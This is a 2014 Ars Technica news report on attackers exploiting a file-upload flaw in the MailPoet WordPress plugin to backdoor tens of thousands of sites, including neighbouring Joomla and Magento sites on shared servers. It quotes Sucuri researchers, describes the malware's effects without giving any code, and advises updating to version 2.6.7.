# Mass exploit of WordPress plugin backdoors sites running Joomla, Magento, too

MailPoet attacks commandeer an estimated 30,000 to 50,000 sites, researcher says.

[Dan Goodin](https://arstechnica.com/author/dan-goodin/)
–
Jul 23, 2014 3:56 pm

| [37](https://arstechnica.com/information-technology/2014/07/mass-exploit-of-wordpress-plugin-backdoors-sites-running-joomla-magento-too/#comments "37 comments")

Text
settings

Story text

Size
Small
Standard
Large

Width
\*

Standard
Wide

Links
Standard
Orange

\* Subscribers only

  [Learn more](/store/product/subscriptions/)

Minimize to nav

As many as 50,000 websites have been remotely commandeered by attackers exploiting a recently patched vulnerability in a popular plugin for the WordPress content management system, security researchers said Wednesday.

As [Ars reported in early July](http://arstechnica.com/security/2014/07/wordpress-plugin-with-1-7-million-downloads-puts-sites-at-risk-of-takeover/), the vulnerability in [MailPoet](https://wordpress.org/plugins/wysija-newsletters/), a WordPress plugin with more than 1.7 million downloads, allows attackers to upload any file of their choice to vulnerable servers. In the three weeks since then, attackers have exploited the bug to install a backdoor on an estimated 30,000 to 50,000 websites, some that don't even run WordPress software or that don't have MailPoet enabled, according to Daniel Cid, CTO of security firm Sucuri.

"To be clear, the MailPoet vulnerability is the entry point," he wrote in a [blog post](http://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html). "It doesn't mean your website has to have it enabled or that you have it on the website; if it resides on the server, in a neighboring website, it can still affect your website." In an e-mail to Ars, he elaborated:

> The malware injection code is actually trying to compromise all PHP files that it can on the server. So if you have a site at /var/www/site1.com with MailPoet and another site at /var/www/site2.com without it, the malware injector from site1.com will try to compromise site2.com as well. We had a client that all his 20+ sites got injected, because one site inside the same shared account had MailPoet on it. That's why we were seeing Joomla and Magento sites with the same malware as well. Took us a bit of time to connect all the dots and find the entry point on them.

Sucuri researcher Peter Gramantik [first reported the mass exploitation affecting WordPress](http://blog.sucuri.net/2014/07/malware-infection-breaking-wordpress-sites.html) Tuesday. The injected malware installs a backdoor account that gives attackers full administrative control. It also injects backdoor code into all themes and core files. Making matters worse, the malicious code also overwrites valid files, a side effect that causes many sites to fall over and display the message: "Parse error: syntax error, unexpected ‘)’ in /home/user/public\_html/site/wp-config.php on line 91."

Cid has said that the only safe version of MailPoet is the recently released 2.6.7, which should be installed immediately on all vulnerable servers. MailPoet gives sites added abilities to create newsletters and automatically post notifications and responses.

Related Stories

[WordPress plugin with 1.7 million downloads puts sites at risk of takeover](https://arstechnica.com/information-technology/2014/07/wordpress-plugin-with-1-7-million-downloads-puts-sites-at-risk-of-takeover/)

Sites running MailPoet should install update ASAP.

[![Photo of Dan Goodin](/wp-content/uploads/2018/10/Dang.jpg)](https://arstechnica.com/author/dan-goodin/)
[Dan Goodin](https://arstechnica.com/author/dan-goodin/)
Senior Security Editor

[Dan Goodin](https://arstechnica.com/author/dan-goodin/)
Senior Security Editor

Dan Goodin is Senior Security Editor at Ars Technica, where he oversees coverage of malware, computer espionage, botnets, hardware hacking, encryption, and passwords. In his spare time, he enjoys gardening, cooking, and following the independent music scene. Dan is based in San Francisco. Follow him at [here](https://infosec.exchange/%40dangoodin) on Mastodon and [here](https://bsky.app/profile/dangoodin.bsky.social) on Bluesky. Contact him on Signal at DanArs.82.

[37 Comments](https://arstechnica.com/information-technology/2014/07/mass-exploit-of-wordpress-plugin-backdoors-sites-running-joomla-magento-too/#comments "37 comments")

Comments

[Forum view](https://arstechnica.com/civis/threads/mass-exploit-of-wordpress-plugin-backdoors-sites-running-joomla-magento-too.1250535/)

![Loading](https://arstechnica.com/wp-content/themes/ars-v9/public/images/firework-loader.75ab30.gif)

[Prev story](https://arstechnica.com/gaming/2014/07/client-files-may-hint-at-possible-analog-stick-addition-for-steam-controller/ "Go to: Client files mysteriously show an analog stick on mock-up Steam controller")

[Next story](https://arstechnica.com/information-technology/2014/07/multi-user-beamforming-is-here-in-270-1-7gbps-asus-wi-fi-router/ "Go to: Multi-user beamforming is here—in $270, 1.7Gbps Asus Wi-Fi router")

Most Read

1. [![Listing image for first story in Most Read: For real, we may be taking blood pressure readings all wrong](https://cdn.arstechnica.net/wp-content/uploads/2025/01/GettyImages-110883323-768x432.jpg)](https://arstechnica.com/health/2025/01/for-real-we-may-be-taking-blood-pressure-readings-all-wrong/)

   1.
   [For real, we may be taking blood pressure readings all wrong](https://arstechnica.com/health/2025/01/for-real-we-may-be-taking-blood-pressure-readings-all-wrong/)
2. 2.
   [Nvidia starts to wind down support for old GPUs, including the long-lived GTX 1060](https://arstechnica.com/gadgets/2025/01/nvidia-winding-down-support-for-older-gpus-including-the-legendary-750-ti-and-1060/)
3. 3.
   [ISP failed to comply with New York’s $15 broadband law—until Ars got involved](https://arstechnica.com/tech-policy/2025/01/isp-failed-to-comply-with-new-yorks-15-broadband-law-until-ars-got-involved/)
4. 4.
   [3D-printed “ghost gun” ring comes to my community—and leaves a man dead](https://arstechnica.com/culture/2025/01/3d-printed-ghost-gun-ring-comes-to-my-community-and-leaves-a-man-dead/)
5. 5.
   [Florida man eats diet of butter, cheese, beef; cholesterol oozes from his body](https://arstechnica.com/health/2025/01/florida-man-eats-diet-of-butter-cheese-beef-cholesterol-oozes-from-his-body/)

Customize

Ars Technica has been separating the signal from
the noise for over 25 years. With our unique combination of
technical savvy and wide-ranging interest in the technological arts
and sciences, Ars is the trusted source in a sea of information. After
all, you don’t need to know everything, only what’s important.

More
from Ars

* [About Us](https://arstechnica.com/about-us/)
* [Staff Directory](https://arstechnica.com/staff-directory/)
* [Newsletters](https://arstechnica.com/newsletters/)
* [Ars Videos](https://arstechnica.com/video/)
* [General FAQ](https://arstechnica.com/general-faq/)
* [RSS Feeds](https://arstechnica.com/rss-feeds/)

Contact

* [Contact us](https://arstechnica.com/contact-us/)
* [Advertise with us](https://www.condenast.com/brands/ars-technica)
* [Reprints](https://arstechnica.com/reprints/)

Do Not Sell My Personal
Information

© 2025 Condé Nast. All rights reserved. Use of and/or
registration on any portion of this site constitutes acceptance of our [User Agreement](https://www.condenast.com/user-agreement/) and
[Privacy Policy and
Cookie Statement](https://www.condenast.com/privacy-policy/) and [Ars
Technica Addendum](/amendment-to-conde-nast-user-agreement-privacy-policy/) and [Your
California Privacy Rights](https://www.condenast.com/privacy-policy/#california). Ars Technica may earn compensation on
sales from links on this site. [Read our
affiliate link policy](/affiliate-link-policy/). The material on this site may not be
reproduced, distributed, transmitted, cached or otherwise used, except
with the prior written permission of Condé Nast. [Ad
Choices](https://www.aboutads.info/)


